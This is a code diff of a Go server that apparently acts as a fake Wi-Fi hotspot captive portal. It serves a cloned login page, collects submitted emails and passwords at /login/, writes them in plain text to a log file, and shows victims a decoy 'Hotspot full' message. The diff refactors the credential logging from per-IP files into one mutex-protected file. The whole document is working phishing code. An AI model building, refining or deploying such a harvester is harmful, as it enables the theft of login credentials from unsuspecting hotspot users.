@@ -2,11 +2,11 @@ package main
 
 import (
     "fmt"
+    "sync"
     "flag"
     "log"
     "os"
     "io/ioutil"
-    "path"
     "net/url"
     "net/http"
 )
@@ -16,28 +16,34 @@ const INDEX_HTML = "index.html"
 const SUCCESS_MSG = "Hotspot full. Try again later."
 
 const DEFAULT_PORT = 8080
-const DEFAULT_LOG_FOLDER = "__log__"
+const DEFAULT_LOG_FILE = "log.txt"
 const DEFAULT_RES_FOLDER = "__res__"
+
+var FILE_IO_MUTEX sync.Mutex
 
 func main() {
 
     buildPtr := flag.Bool("build", false, "Wether to gather the resources of " + INDEX_RAW_HTML + ". This will exit after build, and not serve.")
     resFolderPtr := flag.String("resFolder", DEFAULT_RES_FOLDER, "The resource folder.")
-    logFolderPtr := flag.String("logFolder", DEFAULT_LOG_FOLDER, "The folder to store logs.")
+    logFilePtr := flag.String("logFile", DEFAULT_LOG_FILE, "The file to write logs.")
     portPtr := flag.Uint("port", DEFAULT_PORT, "Port to serve on.")
 
     flag.Parse()
-    os.MkdirAll(*logFolderPtr, os.ModePerm)
 
     if (*buildPtr) {
         build()
     } else {
-        serve(*portPtr, *resFolderPtr, *logFolderPtr)
+        serve(*portPtr, *resFolderPtr, *logFilePtr)
     }
 
 }
 
-func serve(port uint, resFolder string, logFolder string) {
+func serve(port uint, resFolder string, logFile string) {
+
+    LOGFILE, _ := os.OpenFile(logFile,
+        os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+    defer LOGFILE.Close()
+
 
     http.HandleFunc("/",
         func(w http.ResponseWriter, r *http.Request) {
@@ -47,7 +53,6 @@ func serve(port uint, resFolder string, logFolder string) {
     http.HandleFunc("/login/",
         func(w http.ResponseWriter, r *http.Request) {
 
-            fmt.Println(r.Method)
             if (r.Method != "POST") {
                fmt.Fprintln(w, "404 Not found.")
                return
@@ -67,7 +72,10 @@ func serve(port uint, resFolder string, logFolder string) {
             pass := values["pass"][0]
 
             log.Printf("Email: %s, Pass: %s", email, pass)
-            logCredentials(r.RemoteAddr, email, pass)
+
+            FILE_IO_MUTEX.Lock()
+            fmt.Fprintf(LOGFILE, "user: %s, pass: %s\n", email, pass)
+            FILE_IO_MUTEX.Unlock()
 
     })
 
@@ -96,22 +104,6 @@ func serveFile(
 
     http.ServeFile(w, r, filename)
     return nil
-}
-
-func logCredentials(
-    remoteAddr string,
-    user string,
-    pass string) {
-
-    logfile := path.Join(
-        DEFAULT_LOG_FOLDER,
-        remoteAddr + ".log")
-
-    file, _ := os.OpenFile(logfile,
-        os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-    fmt.Fprintf(file, "user: %s, pass: %s\n", user, pass)
-    file.Close()
-
 }
 
 func build() {
